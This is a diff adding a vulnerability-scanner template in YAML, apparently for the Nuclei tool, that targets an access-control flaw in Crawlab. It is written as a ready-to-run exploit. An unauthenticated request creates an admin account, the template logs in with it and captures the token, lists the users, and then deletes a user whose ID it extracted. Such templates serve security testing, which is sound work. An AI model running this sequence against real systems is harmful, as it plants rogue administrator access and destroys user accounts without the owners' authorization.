@@ -1,0 +1,92 @@
+id: crawlab-idor
+
+info:
+  name: Crawlab IDOR Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploits an Insecure Direct Object Reference (IDOR) vulnerability in Crawlab, allowing unauthorized user manipulation.
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/Crawlab/Crawlab%20users%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.html
+
+variables:
+  random_user: "{{rand_int(200000, 900000)}}"
+
+http:
+  - id: create-user
+    method: PUT
+    path:
+      - "{{BaseURL}}/api/users"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "{{random_user}}",
+        "password": "{{random_user}}",
+        "role": "admin",
+        "email": "{{random_user}}@qq.com"
+      }
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":"ok"'
+          - '"message":"success"'
+    matchers-condition: and
+
+  - id: login-user
+    method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "{{random_user}}",
+        "password": "{{random_user}}"
+      }
+    extractors:
+      - type: regex
+        name: auth_token
+        group: 1
+        regex:
+          - '"status":"ok","message":"success","data":"(.*?)"'
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: list-users
+    method: GET
+    path:
+      - "{{BaseURL}}/api/users"
+    headers:
+      Authorization: '{{auth_token}}'
+    extractors:
+      - type: regex
+        name: user_id
+        group: 1
+        regex:
+          - '"_id":"(.*?)"'
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: delete-user
+    method: DELETE
+    path:
+      - "{{BaseURL}}/api/users/{{user_id}}"
+    headers:
+      Authorization: '{{auth_token}}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":"ok"'
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
